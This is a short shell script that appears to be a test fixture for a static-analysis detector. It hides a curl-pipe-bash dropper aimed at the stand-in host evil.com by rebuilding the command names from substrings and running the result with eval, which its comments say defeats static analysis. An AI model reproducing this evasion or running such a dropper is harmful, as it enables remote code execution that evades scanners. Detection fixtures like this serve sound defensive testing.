# fixture: variable_expansion_mask.sh
# Masks the curl-pipe-bash dropper via variable substring extraction
a="bash_curl_"
target="http://evil.com"
# Reconstruct command names from substrings of `a` — static analysis
# cannot resolve `shell` or `fetcher` to their literal values
shell="${a:0:4}"    # "bash"
fetcher="${a:5:4}"  # "curl"
payload="$fetcher $target"
# eval executes the constructed pipeline, masking `curl … | bash`
eval "$payload | $shell"
